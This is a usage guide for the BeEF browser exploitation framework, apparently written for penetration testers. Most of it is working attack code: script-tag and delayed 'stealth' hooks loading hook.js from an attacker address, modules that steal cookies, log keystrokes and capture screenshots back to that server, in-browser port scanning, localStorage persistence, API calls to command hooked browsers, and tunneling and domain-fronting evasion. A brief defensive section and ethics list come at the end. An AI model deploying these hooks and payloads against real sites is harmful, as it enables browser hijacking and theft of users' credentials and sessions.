# BeEF - Browser Exploitation Framework

Advanced penetration testing tool for web browser exploitation and client-side attack vectors.

## Installation

```bash
# Ubuntu/Debian/Kali
apt install beef-xss

# From source
git clone https://github.com/beefproject/beef.git
cd beef
./install
./beef

# Docker installation
docker pull beefproject/beef
docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 beefproject/beef

# Manual setup
git clone https://github.com/beefproject/beef.git
cd beef
bundle install
ruby beef
```

## Basic Setup and Configuration

### Initial Configuration
```yaml
# config.yaml key settings
beef:
    version: '0.5.0.0'
    debug: false
    crypto_default_value_length: 80
    
http:
    debug: false
    host: "0.0.0.0"
    port: "3000"
    
https:
    enable: false
    host: "0.0.0.0" 
    port: "3443"

database:
    driver: "sqlite"
    db_file: "beef.db"
```

### Web UI Access
- Default URL: http://localhost:3000/ui/panel
- Default credentials: beef:beef
- Hook URL: http://localhost:3000/hook.js

## Hook Deployment

### Basic Hook Injection
```html
<!-- Basic hook -->
<script src="http://192.168.1.100:3000/hook.js"></script>

<!-- Stealth hook -->
<script>
var s = document.createElement('script');
s.src = 'http://192.168.1.100:3000/hook.js';
s.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(s);
</script>

<!-- Image-based hook -->
<img src="http://192.168.1.100:3000/hook.js" style="display:none">

<!-- CSS-based hook -->
<link rel="stylesheet" type="text/css" href="http://192.168.1.100:3000/hook.js">
```

### Advanced Hook Techniques
```javascript
// Dynamic hook loading
(function() {
    var beef = document.createElement('script');
    beef.src = 'http://192.168.1.100:3000/hook.js';
    beef.onload = function() {
        console.log('BeEF hook loaded');
    };
    document.head.appendChild(beef);
})();

// Conditional hook loading
if (document.domain !== 'trusted-site.com') {
    var s = document.createElement('script');
    s.src = 'http://192.168.1.100:3000/hook.js';
    document.head.appendChild(s);
}

// Delayed hook loading
setTimeout(function() {
    var s = document.createElement('script');
    s.src = 'http://192.168.1.100:3000/hook.js';
    document.head.appendChild(s);
}, 5000);
```

## Core Modules

### Browser Information
- **Get Browser Details**: Collect browser version, plugins, screen resolution
- **Detect Software**: Identify installed software and browser extensions
- **Fingerprint Browser**: Create unique browser fingerprints
- **Get System Info**: Gather operating system details

### Social Engineering
- **Fake Flash Update**: Present fake Flash update prompts
- **Fake Notification Bar**: Display fake browser notifications
- **Create Alert Dialog**: Generate convincing alert boxes
- **Clipboard Hijack**: Access and modify clipboard contents

### Network Reconnaissance
- **Internal Network Fingerprinting**: Scan internal network ranges
- **Port Scanner**: Perform port scans from victim's browser
- **Protocol Scanner**: Detect available network protocols
- **Network Discovery**: Map network topology and services

### Credential Harvesting
- **Pretty Theft**: Create convincing login prompts
- **Simple Hijacker**: Capture form submissions
- **Clippy**: Implement fake assistants for credential theft
- **TabNabbing**: Perform tab-based phishing attacks

## Advanced Attack Modules

### Browser Exploits
```javascript
// Example: Get cookies
beef.execute(function() {
    beef.net.send('/modules/host/get_cookie', 0, 'cookies=' + document.cookie);
});

// Example: Keylogger
beef.execute(function() {
    var keys = '';
    document.addEventListener('keypress', function(e) {
        keys += String.fromCharCode(e.which);
        if (keys.length > 50) {
            beef.net.send('/modules/host/keylogger', 0, 'keys=' + keys);
            keys = '';
        }
    });
});

// Example: Screenshot
beef.execute(function() {
    html2canvas(document.body).then(function(canvas) {
        var imgData = canvas.toDataURL();
        beef.net.send('/modules/host/screenshot', 0, 'screenshot=' + imgData);
    });
});
```

### Network Pivoting
```javascript
// Internal network scanning
beef.execute(function() {
    var targets = ['192.168.1.1', '192.168.1.100', '10.0.0.1'];
    targets.forEach(function(target) {
        var img = new Image();
        img.onload = function() {
            beef.net.send('/modules/network/ping_sweep', 0, 'target=' + target + '&status=up');
        };
        img.onerror = function() {
            beef.net.send('/modules/network/ping_sweep', 0, 'target=' + target + '&status=down');
        };
        img.src = 'http://' + target + ':80/favicon.ico?t=' + Math.random();
    });
});

// Port scanning
beef.execute(function() {
    var host = '192.168.1.100';
    var ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995];
    
    ports.forEach(function(port) {
        var ws = new WebSocket('ws://' + host + ':' + port);
        ws.onopen = function() {
            beef.net.send('/modules/network/port_scan', 0, 
                'host=' + host + '&port=' + port + '&status=open');
            ws.close();
        };
        ws.onerror = function() {
            beef.net.send('/modules/network/port_scan', 0, 
                'host=' + host + '&port=' + port + '&status=closed');
        };
    });
});
```

### Persistence Techniques
```javascript
// Local storage persistence
beef.execute(function() {
    localStorage.setItem('beef_hook', 'http://192.168.1.100:3000/hook.js');
    
    // Re-inject on page load
    window.addEventListener('load', function() {
        var hookUrl = localStorage.getItem('beef_hook');
        if (hookUrl) {
            var s = document.createElement('script');
            s.src = hookUrl;
            document.head.appendChild(s);
        }
    });
});

// Service worker persistence
beef.execute(function() {
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js').then(function(registration) {
            registration.update();
        });
    }
});
```

## Custom Module Development

### Module Structure
```ruby
# modules/custom/example_module/module.rb
class Example_module < BeEF::Core::Command
  def self.options
    return [
      {'name' => 'target_url', 'ui_label' => 'Target URL', 'value' => 'http://example.com'},
      {'name' => 'data', 'ui_label' => 'Data to Send', 'value' => 'test_data'}
    ]
  end

  def post_execute
    save({'result' => @datastore['result']})
  end
end
```

### JavaScript Command
```javascript
// modules/custom/example_module/command.js
beef.execute(function() {
    var target_url = '<%= @target_url %>';
    var data = '<%= @data %>';
    
    // Custom functionality
    var xhr = new XMLHttpRequest();
    xhr.open('POST', target_url, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 
                'result=' + encodeURIComponent(xhr.responseText));
        }
    };
    
    xhr.send('data=' + encodeURIComponent(data));
});
```

### Module Configuration
```yaml
# modules/custom/example_module/config.yaml
beef:
    module:
        example_module:
            enable: true
            category: "Custom"
            name: "Example Module"
            description: "Custom module example"
            authors: ["Your Name"]
            target:
                working: ["All"]
```

## REST API Integration

### Authentication
```bash
# Get authentication token
curl -H "Content-Type: application/json" -X POST \
  -d '{"username":"beef","password":"beef"}' \
  http://localhost:3000/api/admin/login

# Response: {"success":true,"token":"your-token-here"}
```

### API Operations
```bash
# List hooked browsers
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://localhost:3000/api/hooks

# Get browser details
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://localhost:3000/api/hooks/HOOK_ID

# Execute command
curl -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -X POST -d '{"command_module":"get_cookie","command_input":{}}' \
  http://localhost:3000/api/hooks/HOOK_ID/commands

# Get command results
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://localhost:3000/api/hooks/HOOK_ID/commands/COMMAND_ID
```

## Deployment Strategies

### Cloud Deployment
```bash
# AWS deployment
# 1. Launch EC2 instance
# 2. Configure security groups (ports 3000, 6789, 61985, 61986)
# 3. Install BeEF
# 4. Configure external access

# Docker Compose deployment
version: '3'
services:
  beef:
    image: beefproject/beef
    ports:
      - "3000:3000"
      - "6789:6789"
      - "61985:61985"
      - "61986:61986"
    volumes:
      - ./beef-data:/beef/data
    environment:
      - BEEF_PASSWORD=newpassword
```

### Tunneling and Evasion
```bash
# SSH tunneling
ssh -L 3000:localhost:3000 user@beef-server

# Ngrok tunneling
ngrok http 3000

# CloudFlare tunnel
cloudflared tunnel --url http://localhost:3000

# Domain fronting
# Configure CDN to forward requests to BeEF server
```

## Defensive Measures and Detection

### Common Indicators
- Unusual JavaScript requests to external domains
- Abnormal browser behavior patterns
- Network connections to suspicious ports
- Presence of hook.js or similar files

### Mitigation Strategies
```javascript
// Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

// XSS Protection headers
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY

// Hook detection
(function() {
    var scripts = document.getElementsByTagName('script');
    for (var i = 0; i < scripts.length; i++) {
        if (scripts[i].src.indexOf('hook.js') > -1) {
            console.warn('Potential BeEF hook detected!');
            // Alert security team
        }
    }
})();
```

## Best Practices

### Operational Security
1. Use isolated testing environments
2. Implement proper access controls
3. Regular security updates
4. Secure hook deployment methods
5. Monitor and log all activities

### Legal and Ethical Considerations
1. Obtain proper authorization
2. Define clear scope boundaries
3. Protect collected data
4. Follow responsible disclosure
5. Document all activities

Powerful framework for comprehensive browser-based penetration testing and client-side security assessment.
